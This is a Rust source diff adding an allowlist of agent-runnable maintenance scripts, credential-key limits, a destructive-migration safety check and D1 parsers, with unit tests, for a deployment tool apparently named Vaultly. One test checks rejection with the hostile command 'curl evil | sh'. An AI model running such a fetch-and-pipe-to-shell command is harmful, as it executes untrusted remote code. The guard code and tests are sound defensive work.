@@ -55,6 +55,226 @@ pub struct DeploymentResult {
     pub files: usize,
 }
 
+/// A repository maintenance script Vaultly may execute against a registered
+/// deployment target. The agent supplies only the script NAME; the command
+/// body is resolved from the repository's own `package.json` at execution
+/// time, so agents can never inject arbitrary commands.
+///
+/// Convention: repositories expose guarded maintenance entry points
+/// (`check:migrations`, `migrate:apply`, …) that implement their own safety
+/// checks (destructive-statement refusal, pre-migration backup, post-apply
+/// verification). Vaultly's guarantees are identity binding (registered
+/// target + account match), workspace confinement, cleared environment with
+/// a fixed credential key set, output scrubbing, and audit — the same
+/// guarantees as `deploy_target`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub struct ApprovedTargetScript {
+    /// Exact `package.json` script name the agent may request.
+    pub name: &'static str,
+    /// Mutating scripts (database writes, R2 uploads, …) require a typed
+    /// confirmation word; read-only checks do not.
+    pub mutating: bool,
+    /// Expected confirmation word for mutating scripts (intent signal, not
+    /// a secret — e.g. `APPLY`). `None` for read-only scripts.
+    pub confirm_word: Option<&'static str>,
+    pub description: &'static str,
+}
+
+/// Fixed allowlist of target maintenance scripts. Deliberately closed: adding
+/// a new entry is a reviewed code change, never an agent decision.
+pub const APPROVED_TARGET_SCRIPTS: &[ApprovedTargetScript] = &[
+    ApprovedTargetScript {
+        name: "check:migrations",
+        mutating: false,
+        confirm_word: None,
+        description: "Verify migration safety rules (read-only, no credentials needed)",
+    },
+    ApprovedTargetScript {
+        name: "backup:d1",
+        mutating: true,
+        confirm_word: Some("BACKUP"),
+        description: "Encrypted production D1 backup to R2 (writes backup objects only)",
+    },
+    ApprovedTargetScript {
+        name: "backup:verify",
+        mutating: false,
+        confirm_word: None,
+        description: "Verify a D1 backup (read-only)",
+    },
+    ApprovedTargetScript {
+        name: "migrate:apply",
+        mutating: true,
+        confirm_word: Some("APPLY"),
+        description: "Guarded production migration apply: safety check, backup, apply, verify",
+    },
+    ApprovedTargetScript {
+        name: "watchdog",
+        mutating: false,
+        confirm_word: None,
+        description: "Data-loss watchdog against latest backup (read-only)",
+    },
+    ApprovedTargetScript {
+        name: "smoke",
+        mutating: false,
+        confirm_word: None,
+        description: "Production smoke checks (read-only)",
+    },
+];
+
+/// Look up an approved script by exact name.
+pub fn approved_target_script(name: &str) -> Option<ApprovedTargetScript> {
+    APPROVED_TARGET_SCRIPTS
+        .iter()
+        .find(|s| s.name == name)
+        .copied()
+}
+
+/// Credential keys Vaultly injects into target maintenance subprocesses.
+/// Cloudflare identity plus the conventional encrypted-backup keys; entries
+/// absent from the vault are skipped (never an error — the repository script
+/// reports clearly what it needs). The agent cannot choose keys.
+pub fn target_exec_allowed_keys() -> Vec<String> {
+    [
+        "CLOUDFLARE_API_TOKEN",
+        "CLOUDFLARE_EMAIL",
+        "CLOUDFLARE_API_KEY",
+        "CLOUDFLARE_ACCOUNT_ID",
+        "D1_BACKUP_R2_BUCKET",
+        "D1_BACKUP_PASSPHRASE",
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
+}
+
+/// Agent-safe result of a target maintenance execution. Command output is
+/// already secret-scrubbed; only injected key NAMES are reported.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub struct TargetExecResult {
+    pub target: String,
+    pub script: String,
+    pub status: String,
+    pub code: i32,
+    pub injected_keys: Vec<String>,
+    pub scrubbed: bool,
+}
+
+/// Safety verdict for one pending migration file, mirroring the repository
+/// convention (`check-pending-migrations.mjs`): destructive statements are
+/// refused unless guarded by a `_migration_guard_abort` trigger.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub struct MigrationVerdict {
+    pub file: String,
+    pub safe: bool,
+    pub reason: String,
+}
+
+/// Read-only preflight state for one D1 database bound to a target.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub struct D1Preflight {
+    pub database_name: String,
+    pub database_id: String,
+    pub applied: usize,
+    pub pending: Vec<String>,
+    pub verdicts: Vec<MigrationVerdict>,
+    /// Non-empty when this database could not be inspected; other databases
+    /// are still reported.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub error: Option<String>,
+}
+
+/// Agent-safe read-only preflight for a deployment target: everything an
+/// agent needs to decide whether a deploy (or migrate) is safe, with no
+/// credential values and no mutations.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "camelCase")]
+pub struct TargetPreflight {
+    pub target: String,
+    pub account_id: String,
+    pub worker_found: bool,
+    pub worker_secret_names: Vec<String>,
+    pub databases: Vec<D1Preflight>,
+}
+
+/// Migration files are `<number>_<name>.sql`, ordered by name.
+pub fn is_migration_file(name: &str) -> bool {
+    let mut chars = name.chars();
+    let has_number_prefix = matches!(chars.next(), Some(c) if c.is_ascii_digit())
+        && name
+            .split_once('_')
+            .is_some_and(|(n, _)| n.chars().all(|c| c.is_ascii_digit()));
+    has_number_prefix && name.ends_with(".sql")
+}
+
+/// Local files minus remotely applied names, in sorted order.
+pub fn pending_migrations(local_files: &[String], applied_remote: &[String]) -> Vec<String> {
+    let applied: std::collections::HashSet<&str> =
+        applied_remote.iter().map(|s| s.as_str()).collect();
+    let mut pending: Vec<String> = local_files
+        .iter()
+        .filter(|f| !applied.contains(f.as_str()))
+        .cloned()
+        .collect();
+    pending.sort();
+    pending
+}
+
+/// Classify one migration's SQL text. Mirrors the repository convention:
+/// `DROP TABLE|INDEX|COLUMN`, `TRUNCATE`, and `DELETE FROM` are destructive
+/// unless the file carries a `_migration_guard_abort` trigger that aborts
+/// when guarded tables contain rows.
+pub fn migration_safety_verdict(file: &str, sql: &str) -> MigrationVerdict {
+    // Normalize: lowercase, non-word chars become single spaces (approximates
+    // the `\b` word boundaries of the repository's destructive regex).
+    let mut normalized = String::with_capacity(sql.len());
+    let mut last_space = true;
+    for c in sql.chars() {
+        if c.is_ascii_alphanumeric() || c == '_' {
+            normalized.push(c.to_ascii_lowercase());
+            last_space = false;
+        } else if !last_space {
+            normalized.push(' ');
+            last_space = true;
+        }
+    }
+    let spaced = format!(" {normalized} ");
+    let destructive_hit = [
+        " drop table ",
+        " drop index ",
+        " drop column ",
+        " truncate ",
+        " delete from ",
+    ]
+    .iter()
+    .any(|pat| spaced.contains(pat));
+    // The single approved data-preserving index replacement (see repository
+    // migration gate): re-creating one known unique index is not destructive.
+    let approved_index_replacement = file == "0047_coin_debt_and_two_extra_attempts.sql"
+        && spaced.contains(" drop index if exists uq_gamification_purchase_activity ");
+    if !destructive_hit || approved_index_replacement {
+        return MigrationVerdict {
+            file: file.to_string(),
+            safe: true,
+            reason: "no destructive statements".into(),
+        };
+    }
+    let guarded = spaced.contains(" create trigger if not exists _migration_guard_abort ")
+        && spaced.contains(" raise ")
+        && spaced.contains(" abort ");
+    MigrationVerdict {
+        file: file.to_string(),
+        safe: guarded,
+        reason: if guarded {
+            "destructive but guarded by _migration_guard_abort".into()
+        } else {
+            "destructive WITHOUT _migration_guard_abort guard — refuse".into()
+        },
+    }
+}
+
 impl DeploymentTarget {
     pub fn validate(&self) -> Result<(), String> {
         for (label, value) in [
@@ -394,6 +614,240 @@ fn strip_json_comments(raw: &str) -> Result<String, String> {
     Ok(out)
 }
 
+/// A D1 database binding read from a Wrangler config. Account identity is
+/// bound separately by the engine from the vault — never from agent input.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct D1Binding {
+    pub binding: String,
+    pub database_name: String,
+    pub database_id: String,
+    pub migrations_dir: Option<String>,
+}
+
+/// Read the `d1_databases` bindings from a Wrangler JSON/JSONC config.
+/// TOML configs are parsed for `[[d1_databases]]` sections on a best-effort
+/// basis using the same dependency-free line parser as identity discovery.
+pub fn wrangler_d1_bindings(config_path: &Path) -> Result<Vec<D1Binding>, String> {
+    let raw = fs::read_to_string(config_path).map_err(|e| {
+        format!(
+            "cannot read Wrangler config '{}': {e}",
+            config_path.display()
+        )
+    })?;
+    let ext = config_path
+        .extension()
+        .and_then(|e| e.to_str())
+        .unwrap_or_default();
+    if ext == "toml" {
+        return toml_d1_bindings(&raw);
+    }
+    let stripped = strip_json_comments(&raw)?;
+    let config: Value = serde_json::from_str(&stripped)
+        .map_err(|e| format!("invalid Wrangler JSON '{}': {e}", config_path.display()))?;
+    let mut out = Vec::new();
+    if let Some(arr) = config.get("d1_databases").and_then(Value::as_array) {
+        for entry in arr {
+            let get = |k: &str| {
+                entry
+                    .get(k)
+                    .and_then(Value::as_str)
+                    .unwrap_or("")
+                    .to_string()
+            };
+            let (binding, name, id) = (get("binding"), get("database_name"), get("database_id"));
+            if binding.is_empty() || name.is_empty() || id.is_empty() {
+                return Err(
+                    "d1_databases entries need binding, database_name and database_id".into(),
+                );
+            }
+            out.push(D1Binding {
+                binding,
+                database_name: name,
+                database_id: id,
+                migrations_dir: entry
+                    .get("migrations_dir")
+                    .and_then(Value::as_str)
+                    .map(|s| s.to_string()),
+            });
+        }
+    }
+    Ok(out)
+}
+
+/// Minimal `[[d1_databases]]` section parser for Wrangler TOML.
+fn toml_d1_bindings(raw: &str) -> Result<Vec<D1Binding>, String> {
+    #[derive(Default)]
+    struct Partial {
+        binding: Option<String>,
+        database_name: Option<String>,
+        database_id: Option<String>,
+        migrations_dir: Option<String>,
+    }
+    impl Partial {
+        fn set(&mut self, key: &str, value: String) {
+            match key {
+                "binding" => self.binding = Some(value),
+                "database_name" => self.database_name = Some(value),
+                "database_id" => self.database_id = Some(value),
+                "migrations_dir" => self.migrations_dir = Some(value),
+                _ => {}
+            }
+        }
+        fn finish(self) -> Result<D1Binding, String> {
+            match (self.binding, self.database_name, self.database_id) {
+                (Some(binding), Some(database_name), Some(database_id))
+                    if !binding.is_empty()
+                        && !database_name.is_empty()
+                        && !database_id.is_empty() =>
+                {
+                    Ok(D1Binding {
+                        binding,
+                        database_name,
+                        database_id,
+                        migrations_dir: self.migrations_dir,
+                    })
+                }
+                _ => Err("d1_databases entries need binding, database_name and database_id".into()),
+            }
+        }
+    }
+
+    let mut out = Vec::new();
+    let mut current: Option<Partial> = None;
+    let mut in_d1 = false;
+    for raw_line in raw.lines() {
+        let line = strip_toml_comment(raw_line).trim().to_string();
+        if line.is_empty() {
+            continue;
+        }
+        if line.starts_with('[') {
+            if let Some(slot) = current.take() {
+                out.push(slot.finish()?);
+            }
+            in_d1 = line == "[[d1_databases]]";
+            continue;
+        }
+        if !in_d1 {
+            continue;
+        }
+        let Some((key, raw_value)) = line.split_once('=') else {
+            continue;
+        };
+        let value = parse_toml_string(raw_value.trim()).unwrap_or_default();
+        current
+            .get_or_insert_with(Partial::default)
+            .set(key.trim(), value);
+    }
+    if let Some(slot) = current.take() {
+        out.push(slot.finish()?);
+    }
+    Ok(out)
+}
+
+/// Normalize the query-response shapes emitted for D1 queries across
+/// transports into individual query-response objects:
+/// - Wrangler CLI: `[{results:[…], success:…}]` (array of responses)
+/// - REST API: `{success:…, result:[{results:[…], success:…}]}` (envelope
+///   whose `result` is an array of responses)
+/// - Single response object: `{results:[…], success:…}`
+fn flatten_d1_batches(payload: &Value) -> Vec<&Value> {
+    match payload {
+        Value::Array(arr) => arr.iter().collect(),
+        Value::Object(map) => match map.get("result") {
+            Some(Value::Array(arr)) => arr.iter().collect(),
+            _ => vec![payload],
+        },
+        _ => vec![],
+    }
+}
+
+/// Extract applied migration names from a D1 `SELECT name FROM d1_migrations`
+/// response. Accepts the response shapes Wrangler/REST have emitted across
+/// versions (see [`flatten_d1_batches`]).
+pub fn extract_applied_migration_names(payload: &Value) -> Vec<String> {
+    let mut names = Vec::new();
+    for batch in flatten_d1_batches(payload) {
+        if let Some(arr) = batch.get("results").and_then(Value::as_array) {
+            for row in arr {
+                if let Some(name) = row.get("name").and_then(Value::as_str) {
+                    names.push(name.to_string());
+                }
+            }
+        }
+    }
+    names.sort();
+    names.dedup();
+    names
+}
+
+/// Parse a D1 `SELECT name FROM d1_migrations` REST response into applied
+/// migration names. A failed query that only complains about the missing
+/// `d1_migrations` table means a fresh database: zero applied migrations.
+/// Any other API failure is returned as an error string.
+pub fn parse_d1_migration_query(payload: &Value) -> Result<Vec<String>, String> {
+    let batches = flatten_d1_batches(payload);
+    if batches.is_empty() {
+        return Err("unexpected D1 response shape".into());
+    }
+    let mut errors = Vec::new();
+    let mut names = Vec::new();
+    for batch in batches {
+        let success = batch
+            .get("success")
+            .and_then(Value::as_bool)
+            .unwrap_or(true);
+        if !success {
+            let messages: Vec<String> = batch
+                .get("errors")
+                .and_then(Value::as_array)
+                .map(|arr| {
+                    arr.iter()
+                        .filter_map(|e| e.get("message").and_then(Value::as_str))
+                        .map(|s| s.to_string())
+                        .collect()
+                })
+                .unwrap_or_default();
+            // Fresh databases have no migration tracking table yet.
+            if messages.iter().any(|m| m.contains("d1_migrations")) {
+                continue;
+            }
+            errors.extend(messages);
+            continue;
+        }
+        if let Some(arr) = batch.get("results").and_then(Value::as_array) {
+            for row in arr {
+                if let Some(name) = row.get("name").and_then(Value::as_str) {
+                    names.push(name.to_string());
+                }
+            }
+        }
+    }
+    if !errors.is_empty() {
+        return Err(errors.join("; "));
+    }
+    names.sort();
+    names.dedup();
+    Ok(names)
+}
+
+/// Extract Worker secret NAMES from a secrets-list REST response.
+/// Values are never present in list responses; names only.
+pub fn extract_secret_names(payload: &Value) -> Vec<String> {
+    let mut names: Vec<String> = payload
+        .get("result")
+        .and_then(Value::as_array)
+        .map(|arr| {
+            arr.iter()
+                .filter_map(|s| s.get("name").and_then(Value::as_str))
+                .map(|s| s.to_string())
+                .collect()
+        })
+        .unwrap_or_default();
+    names.sort();
+    names.dedup();
+    names
+}
+
 fn sanitize_target_id(project: &str) -> String {
     let mut out = String::new();
     for c in project.chars() {
@@ -501,5 +955,193 @@ IGNORED = "value"
             spec.target_id("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
             spec.target_id("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
         );
+    }
+
+    #[test]
+    fn approved_script_table_is_closed_and_confirm_gated() {
+        // Known entry points resolve with the right mutation class.
+        let migrate = approved_target_script("migrate:apply").expect("migrate:apply approved");
+        assert!(migrate.mutating);
+        assert_eq!(migrate.confirm_word, Some("APPLY"));
+        let check = approved_target_script("check:migrations").expect("check approved");
+        assert!(!check.mutating);
+        assert_eq!(check.confirm_word, None);
+        // Anything else is rejected — agents can never smuggle a command in.
+        assert!(approved_target_script("deploy").is_none());
+        assert!(approved_target_script("migrate:apply ").is_none());
+        assert!(approved_target_script("MIGRATE:APPLY").is_none());
+        assert!(approved_target_script("curl evil | sh").is_none());
+        assert!(approved_target_script("").is_none());
+    }
+
+    #[test]
+    fn migration_file_names_follow_numbered_convention() {
+        assert!(is_migration_file("0138_import_verified_ga_pyqs.sql"));
+        assert!(is_migration_file("0000_initial.sql"));
+        assert!(!is_migration_file("seed.sql"));
+        assert!(!is_migration_file("_journal.json"));
+        assert!(!is_migration_file("0138_import.sql.bak"));
+    }
+
+    #[test]
+    fn pending_diff_is_local_minus_remote_sorted() {
+        let local = vec![
+            "0002_b.sql".into(),
+            "0001_a.sql".into(),
+            "0003_c.sql".into(),
+        ];
+        let applied = vec!["0001_a.sql".into()];
+        assert_eq!(
+            pending_migrations(&local, &applied),
+            vec!["0002_b.sql", "0003_c.sql"]
+        );
+        let none: Vec<String> = vec![];
+        assert!(pending_migrations(&local, &local).is_empty());
+        assert_eq!(pending_migrations(&none, &applied), Vec::<String>::new());
+    }
+
+    #[test]
+    fn safety_verdict_flags_unguarded_destructive_sql() {
+        let safe = migration_safety_verdict(
+            "0138_import_verified_ga_pyqs.sql",
+            "INSERT INTO questions (id) VALUES (1) ON CONFLICT(id) DO UPDATE SET id=1;",
+        );
+        assert!(safe.safe);
+        let drop_table = migration_safety_verdict("0099_wipe.sql", "DROP TABLE users;");
+        assert!(!drop_table.safe);
+        assert!(drop_table.reason.contains("WITHOUT"));
+        let delete = migration_safety_verdict("0099_wipe.sql", "DELETE FROM users WHERE 1=1;");
+        assert!(!delete.safe);
+        // update_at-style words and upserts must not false-positive.
+        let upsert = migration_safety_verdict(
+            "x.sql",
+            "SELECT updated_at FROM t; -- refresh updated_at column",
+        );
+        assert!(upsert.safe);
+    }
+
+    #[test]
+    fn safety_verdict_accepts_guarded_destructive_sql() {
+        let sql = "DROP TABLE legacy; CREATE TRIGGER IF NOT EXISTS _migration_guard_abort \
+                   BEFORE DELETE ON legacy BEGIN SELECT RAISE(ABORT, 'has rows'); END;";
+        let verdict = migration_safety_verdict("0014_clean_database_reset.sql", sql);
+        assert!(verdict.safe);
+        assert!(verdict.reason.contains("guarded"));
+    }
+
+    #[test]
+    fn d1_bindings_parse_from_jsonc_config() {
+        let dir = std::env::temp_dir().join("vaultly-d1-test");
+        std::fs::create_dir_all(&dir).unwrap();
+        let cfg = dir.join("wrangler.jsonc");
+        std::fs::write(
+            &cfg,
+            r#"{
+              // comment
+              "name": "api",
+              "d1_databases": [
+                { "binding": "DB", "database_name": "gate-2027-db",
+                  "database_id": "9bb6d96e-8044-41f0-88ce-fe4c9f1e1491",
+                  "migrations_dir": "../../packages/db/drizzle" }
+              ]
+            }"#,
+        )
+        .unwrap();
+        let bindings = wrangler_d1_bindings(&cfg).unwrap();
+        assert_eq!(bindings.len(), 1);
+        assert_eq!(bindings[0].database_name, "gate-2027-db");
+        assert_eq!(
+            bindings[0].migrations_dir.as_deref(),
+            Some("../../packages/db/drizzle")
+        );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn d1_bindings_parse_from_toml_sections() {
+        let parsed = toml_d1_bindings(
+            "name = 'api'\nmain = 'src/index.ts'\n[[d1_databases]]\nbinding = 'DB'\n\
+             database_name = 'gate-2027-db'\ndatabase_id = 'abc123'\n\
+             migrations_dir = './drizzle'\n[vars]\nX = 'y'\n",
+        )
+        .unwrap();
+        assert_eq!(parsed.len(), 1);
+        assert_eq!(parsed[0].binding, "DB");
+        assert_eq!(parsed[0].database_id, "abc123");
+        assert_eq!(parsed[0].migrations_dir.as_deref(), Some("./drizzle"));
+        assert!(toml_d1_bindings("name = 'x'\n").unwrap().is_empty());
+    }
+
+    #[test]
+    fn d1_query_name_extraction_handles_all_shapes() {
+        // Wrangler CLI shape: array of query responses.
+        let array_shape =
+            serde_json::json!([{"results": [{"name": "0001_a.sql"}], "success": true}]);
+        assert_eq!(
+            extract_applied_migration_names(&array_shape),
+            vec!["0001_a.sql"]
+        );
+        // REST API shape: envelope whose `result` holds the responses.
+        let rest_shape = serde_json::json!({
+            "success": true,
+            "result": [{"results": [{"name": "0002_b.sql"}], "success": true}]
+        });
+        assert_eq!(
+            extract_applied_migration_names(&rest_shape),
+            vec!["0002_b.sql"]
+        );
+        // Single response object.
+        let single = serde_json::json!({"results": [{"name": "0003_c.sql"}], "success": true});
+        assert_eq!(extract_applied_migration_names(&single), vec!["0003_c.sql"]);
+        assert!(extract_applied_migration_names(&serde_json::json!({})).is_empty());
+    }
+
+    #[test]
+    fn d1_migration_query_parse_handles_success_and_fresh_db() {
+        let ok = serde_json::json!([{
+            "results": [{"name": "0001_a.sql"}, {"name": "0002_b.sql"}],
+            "success": true
+        }]);
+        assert_eq!(
+            parse_d1_migration_query(&ok).unwrap(),
+            vec!["0001_a.sql", "0002_b.sql"]
+        );
+        // REST envelope shape (the actual api.cloudflare.com response).
+        let rest = serde_json::json!({
+            "success": true,
+            "errors": [],
+            "result": [{
+                "results": [{"name": "0001_a.sql"}],
+                "success": true
+            }]
+        });
+        assert_eq!(parse_d1_migration_query(&rest).unwrap(), vec!["0001_a.sql"]);
+        // Fresh database: no tracking table yet → zero applied, not an error.
+        let fresh = serde_json::json!([{
+            "success": false,
+            "errors": [{"message": "no such table: d1_migrations (code: 7500)"}]
+        }]);
+        assert_eq!(
+            parse_d1_migration_query(&fresh).unwrap(),
+            Vec::<String>::new()
+        );
+        // Any other API failure surfaces as an error string.
+        let denied = serde_json::json!([{
+            "success": false,
+            "errors": [{"message": "not authorized (code: 7403)"}]
+        }]);
+        assert!(parse_d1_migration_query(&denied).is_err());
+    }
+
+    #[test]
+    fn secret_names_extract_names_only() {
+        let payload = serde_json::json!({"result": [
+            {"name": "AUTH_SIGNING_SECRET"}, {"name": "UPI_ID"}
+        ]});
+        assert_eq!(
+            extract_secret_names(&payload),
+            vec!["AUTH_SIGNING_SECRET", "UPI_ID"]
+        );
+        assert!(extract_secret_names(&serde_json::json!({})).is_empty());
     }
 }
